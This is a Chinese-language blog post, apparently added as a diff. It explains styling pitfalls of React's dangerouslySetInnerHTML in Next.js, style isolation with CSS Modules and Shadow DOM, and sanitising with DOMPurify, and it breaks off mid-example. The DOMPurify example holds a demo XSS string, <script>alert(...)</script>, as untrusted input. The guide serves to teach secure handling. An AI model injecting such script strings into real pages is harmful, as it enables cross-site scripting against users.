@@ -1,0 +1,670 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="x5-fullscreen" content="true">
+<meta name="full-screen" content="yes">
+<meta name="theme-color" content="#317EFB" />
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=0" name="viewport">
+<meta name="description" content="Next.js 中使用 dangerouslySetInnerHTML 样式的踩坑指南在 Web 开发领域，Next.js 作为一个基于 React 的流行框架，为开发者提供了高效构建应用的能力。在某些场景下，我们可能会用到dangerouslySetInnerHTML这个属性。本文将深入探讨在 Next.js 中使用dangerouslySetInnerHTML处理样式时可能遇到的问题，并提供一">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Next.js 中使用 dangerouslySetInnerHTML 样式的踩坑指南">
+<meta property="og:url" content="http://takosenpai2687.github.io/2025/08/15/Nextjs%E4%B8%AD%E4%BD%BF%E7%94%A8%20dangerouslySetInnerHTML%20%E6%A0%B7%E5%BC%8F%E7%9A%84%E8%B8%A9%E5%9D%91%E6%8C%87%E5%8D%97/index.html">
+<meta property="og:site_name" content="Tako Bay">
+<meta property="og:description" content="Next.js 中使用 dangerouslySetInnerHTML 样式的踩坑指南在 Web 开发领域，Next.js 作为一个基于 React 的流行框架，为开发者提供了高效构建应用的能力。在某些场景下，我们可能会用到dangerouslySetInnerHTML这个属性。本文将深入探讨在 Next.js 中使用dangerouslySetInnerHTML处理样式时可能遇到的问题，并提供一">
+<meta property="og:locale">
+<meta property="article:published_time" content="2025-08-15T10:01:00.000Z">
+<meta property="article:modified_time" content="2025-08-19T01:50:57.860Z">
+<meta property="article:author" content="Tako Senpai">
+<meta property="article:tag" content="前端">
+<meta property="article:tag" content="JS">
+<meta name="twitter:card" content="summary">
+
+
+<title >Next.js 中使用 dangerouslySetInnerHTML 样式的踩坑指南</title>
+
+<!-- Favicon -->
+
+    <link href='/img/tako.png?v=1?v=2.0.9' rel='icon' type='image/png' sizes='16x16' ></link>
+
+
+    <link href='/img/tako.png?v=1?v=2.0.9' rel='icon' type='image/png' sizes='32x32' ></link>
+
+
+
+
+<!-- Plugin -->
+
+
+
+
+    
+<link rel="stylesheet" href="/css/plugins/bootstrap.row.css">
+
+    
+<link rel="stylesheet" href="https://unpkg.com/locomotive-scroll@4.1.4/dist/locomotive-scroll.min.css">
+
+    
+<link rel="stylesheet" href="https://unpkg.com/@fancyapps/ui@4.0/dist/fancybox.css">
+
+    
+    
+
+
+
+
+<!-- Icon -->
+
+    
+<link rel="stylesheet" href="/css/plugins/font-awesome.min.css">
+
+
+
+
+<!-- Variable -->
+<script>window.ASYNC_CONFIG = {"hostname":"takosenpai2687.github.io","author":"Tako Senpai","root":"/","typed_text":["&& Web Developer"],"theme_version":"2.0.9","theme":{"switch":true,"default":"style-light"},"favicon":{"logo":"/img/logo-black.png","icon16":"/img/tako.png?v=1","icon32":"/img/tako.png?v=1","appleTouchIcon":null,"webmanifest":null,"visibilitychange":false,"hidden":"/img/tako.png?v=1","showText":"(/≧▽≦/)咦！又好了！","hideText":"(●—●)喔哟，崩溃啦！"},"i18n":{"placeholder":"搜索文章...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）","author":"本文作者：","copyright_link":"本文链接：","copyright_license_title":"版权声明：","copyright_license_content":"本博客所有文章除特别声明外，均默认采用 undefined 许可协议。","copy_success":"复制成功","copy_failure":"复制失败","open_read_mode":"进入阅读模式","exit_read_mode":"退出阅读模式","notice_outdate_message":"距离上次更新已经 undefined 天了, 文章内容可能已经过时。","just":"刚刚","min":"分钟前","hour":"小时前","day":"天前","month":"个月前"},"swup":false,"plugin":{"flickr_justified_gallery":"https://unpkg.com/flickr-justified-gallery@latest/dist/fjGallery.min.js"},"icons":{"sun":"far fa-sun","moon":"far fa-moon","play":"fas fa-play","email":"far fa-envelope","next":"fas fa-arrow-right","calendar":"far fa-calendar-alt","clock":"far fa-clock","user":"far fa-user","back_top":"fas fa-arrow-up","close":"fas fa-times","search":"fas fa-search","reward":"fas fa-hand-holding-usd","user_tag":"fas fa-user-alt","toc_tag":"fas fa-th-list","read":"fas fa-book-reader","arrows":"fas fa-arrows-alt-h","double_arrows":"fas fa-angle-double-down","copy":"fas fa-copy"},"icontype":"font","highlight":{"plugin":"highlighjs","theme":true,"copy":true,"lang":true,"title":"default","height_limit":200}};</script>
+<script id="async-page-config">window.PAGE_CONFIG = {"isPost":true,"isHome":false,"postUpdate":"2025-08-19 09:50:57"};</script>
+
+<!-- Theme mode css -->
+<link data-swup-theme rel="stylesheet" href="/css/index.css?v=2.0.9" id="trm-switch-style">
+<script>
+    let defaultMode = ASYNC_CONFIG.theme.default !=='auto' ?  ASYNC_CONFIG.theme.default : (window.matchMedia("(prefers-color-scheme: light)").matches ? 'style-light' : 'style-dark')
+    let catchMode = localStorage.getItem('theme-mode') || defaultMode;
+    let type = catchMode === 'style-dark' ? 'add' : 'remove';
+    document.documentElement.classList[type]('dark')
+</script>
+
+<!-- CDN -->
+
+
+    
+    
+
+
+
+<!-- Site Analytics -->
+
+     
+
+    
+        <!-- Google Analytics -->
+        <script async src='https://www.googletagmanager.com/gtag/js?id=G-RQ3ECBBKBP'></script>
+        <script defer>
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-RQ3ECBBKBP');
+        </script>
+    
+
+    
+ 
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body>
+
+  <!-- app wrapper -->
+  <div class="trm-app-frame">
+
+    <!-- page preloader -->
+    <div class="trm-preloader">
+    <div class="trm-holder">
+        <div class="preloader">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+</div>
+    <!-- page preloader end -->
+
+    <!-- change mode preloader -->
+    <div class="trm-mode-swich-animation-frame">
+    <div class="trm-mode-swich-animation">
+        <i class="i-sun"><i class="iconfont far fa-sun"></i></i>
+        <div class="trm-horizon"></div>
+        <i class="i-moon"><i class="iconfont far fa-moon"></i></i>
+    </div>
+</div>
+    <!-- change mode preloader end -->
+
+      <!-- scroll container -->
+      <div id="trm-dynamic-content" class="trm-swup-animation">
+        <div id="trm-scroll-container" class="trm-scroll-container" data-scroll-container style="opacity: 0">
+          <div data-scroll-section id="content" class="trm-scroll-section">
+
+            <div class="locomotive-scroll__sticky-target" style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; pointer-events: none;"></div>
+
+            <!-- top bar -->
+            <header class="trm-top-bar" data-scroll data-scroll-sticky data-scroll-target=".locomotive-scroll__sticky-target" data-scroll-offset="-10">
+	<div class="container">
+		<div class="trm-left-side">
+			<!-- logo -->
+<a href="/" class="trm-logo-frame trm-anima-link">
+    
+        <img alt="logo" src="/img/logo-black.png">
+    
+    
+</a>
+<!-- logo end -->
+		</div>
+		<div class="trm-right-side">
+			<!-- menu -->
+<div class="trm-menu">
+    <nav>
+        <ul>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/" target="">
+                    主页
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/archives/" target="">
+                    归档
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/categories/" target="">
+                    分类
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/tags/" target="">
+                    标签
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/links/" target="">
+                    友链
+                </a>
+                
+            </li>
+            
+        </ul>
+    </nav>
+</div>
+<!-- menu end -->
+			
+    <!-- mode switcher place -->
+    <div class="trm-mode-switcher-place">
+        <div class="trm-mode-switcher">
+            <i class="iconfont far fa-sun"></i>
+            <input class="tgl tgl-light" id="trm-swich" type="checkbox">
+            <label class="trm-swich" for="trm-swich"></label>
+            <i class="iconfont far fa-moon"></i>
+        </div>
+    </div>
+    <!-- mode switcher place end -->
+
+			
+		</div>
+		<div class="trm-menu-btn">
+			<span></span>
+		</div>
+	</div>
+</header>
+            <!-- top bar end -->
+
+            <!-- body -->
+            
+<div class="trm-content-start">
+    <!-- banner -->
+    <div class="trm-banner" data-scroll data-scroll-direction="vertical">
+    
+    <!-- banner cover -->
+    <img style="object-position:top;object-fit:cover;" alt="banner" class="trm-banner-cover" data-scroll data-scroll-direction="vertical" data-scroll-speed="-3" src="/img/sky.png">
+    <!-- banner cover end -->
+    
+
+    <!-- banner content -->
+    <div class="trm-banner-content trm-overlay">
+        <div class="container" data-scroll data-scroll-direction="vertical" data-scroll-speed="0">
+            <div class="row">
+                
+                <div class="col-lg-4"></div>
+                
+                <div class="col-lg-8">
+
+                    <!-- banner title -->
+                    <div class="trm-banner-text ">
+                        <div class="trm-label trm-mb-20">
+                            NEWS LETTER
+                        </div>
+                        <h1 class="trm-mb-30 trm-hsmb-font">
+                            Next.js 中使用 dangerouslySetInnerHTML 样式的踩坑指南
+                        </h1>
+
+                        
+                            <ul class="trm-breadcrumbs trm-label">
+                                <li>
+                                    <a href="/" class="trm-anima-link">Home</a>
+                                </li>
+                                <li>
+                                    <span>
+                                        2025
+                                    </span
+                                ></li>
+                            </ul>
+                        
+                    </div>
+                    <!-- banner title end -->
+
+                    <!-- scroll hint -->
+                    <a href="#about-triger" data-scroll-to="#about-triger" data-scroll-offset="-130" class="trm-scroll-hint-frame">
+                        <div class="trm-scroll-hint"></div>
+                        <span class="trm-label">Scroll down</span>
+                    </a>
+                    <!-- scroll hint end -->
+
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- banner content end -->
+</div>
+    <!-- banner end -->
+    <div class="container">
+        <div class="row">
+            
+                <div id="page-sidebar" class="col-lg-4 hidden-sm">
+                    <!-- main card -->
+                    
+
+<div class="trm-main-card-frame trm-sidebar">
+    <div class="trm-main-card" data-scroll data-scroll-repeat data-scroll-sticky data-scroll-target=".locomotive-scroll__sticky-target" data-scroll-offset="60"> 
+    
+        <div class="trm-user-tabs" id="sidebar-tabs">
+           <div class="trm-tabs-nav trm-mb-40" id="trm-tabs-nav">
+                <div data-to="tabs-user" class="trm-tabs-nav-item">
+                    <i class="iconfont fas fa-user-alt"></i>
+                </div>
+                <div data-to="tabs-toc" class="trm-tabs-nav-item active">
+                    <i class="iconfont fas fa-th-list"></i>
+                </div>
+           </div>
+            <div name="tabs-user" class="trm-tabs-item">
+                <!-- card header -->
+<div class="trm-mc-header">
+    <div class="trm-avatar-frame trm-mb-20">
+        <img alt="Avatar" class="trm-avatar" src="/img/avatar.jpg">
+    </div>
+    <h5 class="trm-name trm-mb-15">
+        Tako Senpai
+    </h5>
+    
+        <div class="trm-label">
+            Student
+            <span class="trm-typed-text">
+                <!-- Words for theme.user.typedText -->
+            </span>
+        </div>
+    
+</div>
+<!-- card header end -->
+                <!-- sidebar social -->
+
+<div class="trm-divider trm-mb-40 trm-mt-40"></div>
+<div class="trm-social">
+    
+        <a href="https://github.com/takosenpai2687" title="github" rel="nofollow" target="_blank">
+            <i class="iconfont fab fa-github"></i>
+        </a>
+    
+        <a href="/" title="takotako" rel="nofollow" target="_blank">
+            <i class="iconfont 🐙"></i>
+        </a>
+    
+</div>
+
+<!-- sidebar social end -->
+                <!-- info -->
+<div class="trm-divider trm-mb-40 trm-mt-40"></div>
+<ul class="trm-table trm-mb-20">
+    
+        <li>
+            <div class="trm-label">
+                📍:
+            </div>
+            <div class="trm-label trm-label-light">
+                Sydney
+            </div>
+        </li>
+    
+        <li>
+            <div class="trm-label">
+                🎂:
+            </div>
+            <div class="trm-label trm-label-light">
+                June 3
+            </div>
+        </li>
+    
+        <li>
+            <div class="trm-label">
+                🌐:
+            </div>
+            <div class="trm-label trm-label-light">
+                中文, English
+            </div>
+        </li>
+    
+        <li>
+            <div class="trm-label">
+                🏫(UG):
+            </div>
+            <div class="trm-label trm-label-light">
+                UNSW
+            </div>
+        </li>
+    
+        <li>
+            <div class="trm-label">
+                🏫(PG):
+            </div>
+            <div class="trm-label trm-label-light">
+                USyd
+            </div>
+        </li>
+    
+</ul>
+<!-- info end -->
+
+                
+    <div class="trm-divider trm-mb-40 trm-mt-40"></div>
+    <!-- action button -->
+    <div class="text-center">
+        <a href="mailto:takosenpai2687@gmail.com" class="trm-btn">
+            联系我
+            <i class="iconfont far fa-envelope"></i>
+        </a>
+    </div>
+    <!-- action button end -->
+
+            </div>
+            <div name="tabs-toc" class="trm-tabs-item active">
+                <div class="post-toc">
+    <ol class="toc"><li class="toc-item toc-level-1"><a rel="nofollow" class="toc-link" href="#Next-js-中使用-dangerouslySetInnerHTML-样式的踩坑指南"  data-scroll-to="#Next-js-中使用-dangerouslySetInnerHTML-样式的踩坑指南"><span class="toc-number">1.</span> <span class="toc-text">Next.js 中使用 dangerouslySetInnerHTML 样式的踩坑指南</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a rel="nofollow" class="toc-link" href="#一、dangerouslySetInnerHTML-是什么？"  data-scroll-to="#一、dangerouslySetInnerHTML-是什么？"><span class="toc-number">1.1.</span> <span class="toc-text">一、dangerouslySetInnerHTML 是什么？</span></a></li><li class="toc-item toc-level-2"><a rel="nofollow" class="toc-link" href="#二、在-Next-js-中使用-dangerouslySetInnerHTML-时样式相关的问题"  data-scroll-to="#二、在-Next-js-中使用-dangerouslySetInnerHTML-时样式相关的问题"><span class="toc-number">1.2.</span> <span class="toc-text">二、在 Next.js 中使用 dangerouslySetInnerHTML 时样式相关的问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a rel="nofollow" class="toc-link" href="#样式污染"  data-scroll-to="#样式污染"><span class="toc-number">1.2.1.</span> <span class="toc-text">样式污染</span></a></li><li class="toc-item toc-level-3"><a rel="nofollow" class="toc-link" href="#样式清除"  data-scroll-to="#样式清除"><span class="toc-number">1.2.2.</span> <span class="toc-text">样式清除</span></a></li></ol></li><li class="toc-item toc-level-2"><a rel="nofollow" class="toc-link" href="#三、样式隔离解决方案"  data-scroll-to="#三、样式隔离解决方案"><span class="toc-number">1.3.</span> <span class="toc-text">三、样式隔离解决方案</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a rel="nofollow" class="toc-link" href="#使用-CSS-Modules"  data-scroll-to="#使用-CSS-Modules"><span class="toc-number">1.3.1.</span> <span class="toc-text">使用 CSS Modules</span></a></li><li class="toc-item toc-level-3"><a rel="nofollow" class="toc-link" href="#Shadow-DOM"  data-scroll-to="#Shadow-DOM"><span class="toc-number">1.3.2.</span> <span class="toc-text">Shadow DOM</span></a></li></ol></li><li class="toc-item toc-level-2"><a rel="nofollow" class="toc-link" href="#四、sanitizer-的用法（以-DOMPurify-为例）"  data-scroll-to="#四、sanitizer-的用法（以-DOMPurify-为例）"><span class="toc-number">1.4.</span> <span class="toc-text">四、sanitizer 的用法（以 DOMPurify 为例）</span></a></li><li class="toc-item toc-level-2"><a rel="nofollow" class="toc-link" href="#五、关于-XSS-攻击"  data-scroll-to="#五、关于-XSS-攻击"><span class="toc-number">1.5.</span> <span class="toc-text">五、关于 XSS 攻击</span></a></li></ol></li></ol>
+</div>
+            </div>
+        </div>
+    
+    </div>
+</div>
+                    <!-- main card end -->
+                </div>
+            
+            <div id="page-content" class="col-lg-8">
+                <div class="trm-content" id="trm-content">
+                    <div data-scroll data-scroll-repeat data-scroll-offset="500" id="about-triger"></div>
+
+                    <div id="post-info" class="row hidden-sm">
+    <div class="col-sm-4">
+        <div class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-calendar-alt trm-icon"></i><br>
+            2025/08/15
+        </div>
+    </div>
+    <div class="col-sm-4">
+        <div class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-clock trm-icon"></i><br>
+            18:01
+        </div>
+    </div>
+    <div class="col-sm-4">
+        <div id="post-author" class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-user trm-icon"></i><br>
+            Tako Senpai
+        </div>
+    </div>
+</div>
+<div class="trm-card ">
+    <article id="article-container" class="trm-publication">
+    <h1 id="Next-js-中使用-dangerouslySetInnerHTML-样式的踩坑指南"><a href="#Next-js-中使用-dangerouslySetInnerHTML-样式的踩坑指南" class="headerlink" title="Next.js 中使用 dangerouslySetInnerHTML 样式的踩坑指南"></a>Next.js 中使用 dangerouslySetInnerHTML 样式的踩坑指南</h1><p>在 Web 开发领域，Next.js 作为一个基于 React 的流行框架，为开发者提供了高效构建应用的能力。在某些场景下，我们可能会用到<code>dangerouslySetInnerHTML</code>这个属性。本文将深入探讨在 Next.js 中使用<code>dangerouslySetInnerHTML</code>处理样式时可能遇到的问题，并提供一些解决方案。</p>
+<h2 id="一、dangerouslySetInnerHTML-是什么？"><a href="#一、dangerouslySetInnerHTML-是什么？" class="headerlink" title="一、dangerouslySetInnerHTML 是什么？"></a>一、dangerouslySetInnerHTML 是什么？</h2><p>在 React（Next.js 基于 React）中，<code>dangerouslySetInnerHTML</code> 是一种用于直接设置 HTML 内容到 DOM 元素的方式。React 默认会对渲染的内容进行转义，以防止跨站脚本攻击（XSS）。但 <code>dangerouslySetInnerHTML</code> 提供了一种“逃生舱口”，允许我们绕过这种默认的转义机制。</p>
+<p>其使用方式如下（以 TypeScript 为例）：</p>
+<figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> rawHtml = <span class="string">&quot;&lt;p&gt;这是一段直接插入的HTML内容&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">MyComponent</span>: <span class="title class_">React</span>.<span class="property">FC</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">dangerouslySetInnerHTML</span>=<span class="string">&#123;&#123;</span> <span class="attr">__html:</span> <span class="attr">rawHtml</span> &#125;&#125; /&gt;</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">MyComponent</span>;</span><br></pre></td></tr></table></figure>
+
+<p>从上述代码可以看出，我们通过传递一个包含<code>__html</code>键的对象给<code>dangerouslySetInnerHTML</code>属性，来设置元素的内部 HTML。需要注意的是，这个属性的命名中包含 “dangerously”，正是因为它可能带来安全风险，如 XSS 攻击。如果 HTML 内容来自用户输入或不可信的第三方源，未经严格的安全检查就直接使用<code>dangerouslySetInnerHTML</code>，恶意用户可能会注入恶意脚本，从而获取敏感信息或控制应用程序。</p>
+<h2 id="二、在-Next-js-中使用-dangerouslySetInnerHTML-时样式相关的问题"><a href="#二、在-Next-js-中使用-dangerouslySetInnerHTML-时样式相关的问题" class="headerlink" title="二、在 Next.js 中使用 dangerouslySetInnerHTML 时样式相关的问题"></a>二、在 Next.js 中使用 dangerouslySetInnerHTML 时样式相关的问题</h2><h3 id="样式污染"><a href="#样式污染" class="headerlink" title="样式污染"></a>样式污染</h3><p>当我们在<code>innerHTML</code>中包含<code>&lt;style&gt;</code>标签时，会出现意想不到的样式污染问题。假设我们有一个包含<code>&lt;style&gt;</code>标签的 HTML 字符串，如下：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> htmlWithStyle = <span class="string">`</span></span><br><span class="line"><span class="string">&lt;style&gt;</span></span><br><span class="line"><span class="string">   body &#123;</span></span><br><span class="line"><span class="string">      background-color: yellow;</span></span><br><span class="line"><span class="string">   &#125;</span></span><br><span class="line"><span class="string">&lt;/style&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;这是一段测试文本&lt;/p&gt;</span></span><br><span class="line"><span class="string">`</span>;</span><br></pre></td></tr></table></figure>
+
+<p>然后在组件中使用<code>dangerouslySetInnerHTML</code>来渲染它：</p>
+<figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">StyleProblemComponent</span>: <span class="title class_">React</span>.<span class="property">FC</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">dangerouslySetInnerHTML</span>=<span class="string">&#123;&#123;</span> <span class="attr">__html:</span> <span class="attr">htmlWithStyle</span> &#125;&#125; /&gt;</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>此时，页面上所有的<code>body</code>元素的背景色都会被设置为黄色，即便我们在项目中使用了像 Tailwind 这样的 CSS 框架，其设置的样式也会被覆盖。这是因为<code>&lt;style&gt;</code>标签中的样式规则是全局生效的，一旦通过<code>dangerouslySetInnerHTML</code>插入到页面中，就会对整个页面的样式产生影响。</p>
+<h3 id="样式清除"><a href="#样式清除" class="headerlink" title="样式清除"></a>样式清除</h3><p>不过，值得庆幸的是，当组件卸载（unmount）时，或者在 Next.js 中切换路由但不刷新页面时，通过<code>dangerouslySetInnerHTML</code>插入的样式会被自动清除。例如，我们在一个页面组件中使用了<code>dangerouslySetInnerHTML</code>设置了样式，当用户导航到另一个页面时，之前设置的样式不会影响新页面的样式。这意味着我们无需担心这些样式会持续污染其他页面。</p>
+<h2 id="三、样式隔离解决方案"><a href="#三、样式隔离解决方案" class="headerlink" title="三、样式隔离解决方案"></a>三、样式隔离解决方案</h2><h3 id="使用-CSS-Modules"><a href="#使用-CSS-Modules" class="headerlink" title="使用 CSS Modules"></a>使用 CSS Modules</h3><p>CSS Modules 是一种将 CSS 样式模块化的方法，在 Next.js 中可以很方便地使用。通过 CSS Modules，每个 CSS 文件都被视为一个模块，其中定义的类名在该模块内是唯一的，不会与其他模块冲突。</p>
+<p>首先，创建一个 CSS Module 文件，例如<code>styles.module.css</code>：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* styles.module.css */</span></span><br><span class="line"><span class="selector-class">.myCustomStyle</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后在组件中引入并使用该样式：</p>
+<figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> styles <span class="keyword">from</span> <span class="string">&quot;./styles.module.css&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> htmlWithText = <span class="string">&quot;&lt;p&gt;这是一段带有样式的文本&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">StyleIsolationComponent</span>: <span class="title class_">React</span>.<span class="property">FC</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">className</span>=<span class="string">&#123;styles.myCustomStyle&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">dangerouslySetInnerHTML</span>=<span class="string">&#123;&#123;</span> <span class="attr">__html:</span> <span class="attr">htmlWithText</span> &#125;&#125;</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    /&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">StyleIsolationComponent</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这样，<code>myCustomStyle</code>这个类名只会在当前组件中生效，不会影响其他组件的样式，从而实现了样式隔离。</p>
+<h3 id="Shadow-DOM"><a href="#Shadow-DOM" class="headerlink" title="Shadow DOM"></a>Shadow DOM</h3><p>Shadow DOM 提供了一种将 DOM 元素及其样式封装起来的方式，使得它们与页面的其他部分隔离开。在 Next.js 中使用 Shadow DOM 相对复杂一些，需要借助一些工具库，如<code>react-shadow</code>。</p>
+<p>安装<code>react-shadow</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install react-shadow</span><br></pre></td></tr></table></figure>
+
+<p>使用示例：</p>
+<figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Shadow</span> &#125; <span class="keyword">from</span> <span class="string">&quot;react-shadow&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> htmlWithStyle = <span class="string">`</span></span><br><span class="line"><span class="string">&lt;style&gt;</span></span><br><span class="line"><span class="string">   p &#123;</span></span><br><span class="line"><span class="string">      color: blue;</span></span><br><span class="line"><span class="string">   &#125;</span></span><br><span class="line"><span class="string">&lt;/style&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;这是一段在Shadow DOM中的文本&lt;/p&gt;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">ShadowDOMComponent</span>: <span class="title class_">React</span>.<span class="property">FC</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">Shadow</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">dangerouslySetInnerHTML</span>=<span class="string">&#123;&#123;</span> <span class="attr">__html:</span> <span class="attr">htmlWithStyle</span> &#125;&#125; /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">Shadow</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">ShadowDOMComponent</span>;</span><br></pre></td></tr></table></figure>
+
+<p>在上述代码中，<code>react-shadow</code>创建了一个 Shadow DOM 环境，其中的样式不会影响到外部的页面元素，有效地实现了样式隔离。</p>
+<h2 id="四、sanitizer-的用法（以-DOMPurify-为例）"><a href="#四、sanitizer-的用法（以-DOMPurify-为例）" class="headerlink" title="四、sanitizer 的用法（以 DOMPurify 为例）"></a>四、sanitizer 的用法（以 DOMPurify 为例）</h2><p>由于<code>dangerouslySetInnerHTML</code>存在安全风险，当 HTML 内容来自不可信源时，我们需要对其进行净化（sanitize）。DOMPurify 是一个流行的用于净化 HTML 的库，可以有效地去除 HTML 中的恶意脚本，防止 XSS 攻击。</p>
+<p>安装 DOMPurify：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install dompurify</span><br></pre></td></tr></table></figure>
+
+<p>在 Next.js 项目中使用 DOMPurify：</p>
+<figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">DOMPurify</span> <span class="keyword">from</span> <span class="string">&quot;dompurify&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 假设这是来自不可信源的HTML内容</span></span><br><span class="line"><span class="keyword">const</span> untrustedHtml = <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;alert(&#x27;恶意脚本&#x27;)&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;这是一段正常的文本&lt;/p&gt;</span></span><br><span class="line"><span 